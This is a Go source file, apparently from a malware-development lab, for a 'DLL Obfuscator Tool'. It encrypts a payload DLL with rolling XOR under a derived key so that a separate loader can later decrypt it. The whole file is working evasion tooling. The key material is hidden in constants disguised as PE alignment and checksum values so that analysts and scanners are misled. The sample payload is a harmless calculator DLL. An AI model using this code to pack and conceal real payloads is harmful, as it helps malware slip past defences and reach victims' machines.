package main

import (
	"encoding/binary" // Make sure this is imported
	"fmt"
	"log"
	"os"
)

// --- Key Derivation Constants and Functions ---
// Disguised PE constants used for shared secret generation
const (
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp"
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k"
	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v"
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue"
	PE_CHECKSUM_SEED          = 0x67891011 // Seed for second part
)

// Helper to construct first part of shared secret
func getPESectionAlignmentString() string {
	buffer := make([]byte, 16)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
	return string(buffer) // Returns "Sample-key-value"
}

// Helper to construct second part of shared secret
func verifyPEChecksumValue(seed uint32) string {
	result := make([]byte, 4)
	checksum := seed
	for i := 0; i < 4; i++ {
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}
	// The specific bytes depend on the seed calculation, e.g., could be something like [0x88 0x0F 0x9A 0x2B]
	return string(result)
}

// Generates the full "shared secret" string
func generatePEValidationKey() string {
	alignmentSignature := getPESectionAlignmentString()
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
	return alignmentSignature + checksumSignature // Concatenates the two parts
}

// Derives the final session key from shared secret and dynamic parameters
func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
	combined := sharedSecret + timestamp + clientID
	// Simple key stretching/derivation: repeat/truncate combined string to 32 bytes
	key := make([]byte, 32)
	lenCombined := len(combined)
	if lenCombined == 0 { // Avoid division by zero if combined is empty
		return string(key) // Return zero key
	}
	for i := 0; i < 32; i++ {
		key[i] = combined[i%lenCombined]
	}
	return string(key)
}

func xorEncryptDecrypt(data []byte, key []byte) []byte {
	// ... (implementation from Lab 7.1) ...
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))
	if len(data) == 0 {
		return []byte{}
	}
	if keyLen == 0 {
		// Handle empty key case if necessary, maybe return data unmodified or error
		log.Println("[!] Warning: Rolling XOR key derived is empty. Returning original data.")
		copy(result, data)
		return result
	}
	for i := 0; i < len(data); i++ {
		keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)
		result[i] = data[i] ^ keyByte
	}
	return result
}

func main() {
	fmt.Println("[+] DLL Obfuscator Tool (Rolling XOR + Derived Key)")

	// --- Configuration ---
	inputDllPath := "calc_dll.dll"
	outputFilePath := "calc_dll.rkd.xor" // New output name
	// Placeholders for dynamic data (MUST MATCH THE LOADER'S PLACEHOLDERS)
	timestamp := "1712345678"       // Example static timestamp
	clientID := "MyTestClient-9876" // Example static client ID

	fmt.Printf("[+] Input DLL: %s\n", inputDllPath)
	fmt.Printf("[+] Output File: %s\n", outputFilePath)
	fmt.Printf("[+] Placeholder Timestamp: %s\n", timestamp)
	fmt.Printf("[+] Placeholder ClientID: %s\n", clientID)

	// --- Derive Key ---
	fmt.Println("[+] Deriving obfuscation key...")
	sharedSecret := generatePEValidationKey()
	finalKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)
	fmt.Printf("    Shared Secret (generated): %s\n", sharedSecret) // Example: "Sample-key-value...."
	fmt.Printf("    Final Key (derived, Hex): %X\n", []byte(finalKey))

	// --- Read Input DLL ---
	fmt.Printf("[+] Reading input DLL '%s'...\n", inputDllPath)
	plaintextBytes, err := os.ReadFile(inputDllPath)
	if err != nil {
		log.Fatalf("[-] Failed to read input file: %v\n", err)
	}
	fmt.Printf("[+] Read %d bytes from input DLL.\n", len(plaintextBytes))

	// --- Obfuscate using Rolling XOR and Derived Key ---
	fmt.Println("[+] Obfuscating DLL bytes using Rolling XOR...")
	obfuscatedBytes := xorEncryptDecrypt(plaintextBytes, []byte(finalKey))
	fmt.Println("[+] Obfuscation complete.")

	// --- Write Output File ---
	fmt.Printf("[+] Writing %d obfuscated bytes to '%s'...\n", len(obfuscatedBytes), outputFilePath)
	err = os.WriteFile(outputFilePath, obfuscatedBytes, 0644)
	if err != nil {
		log.Fatalf("[-] Failed to write output file: %v\n", err)
	}
	fmt.Println("[+] Output file written successfully.")
	fmt.Println("[+] Obfuscator finished.")
}
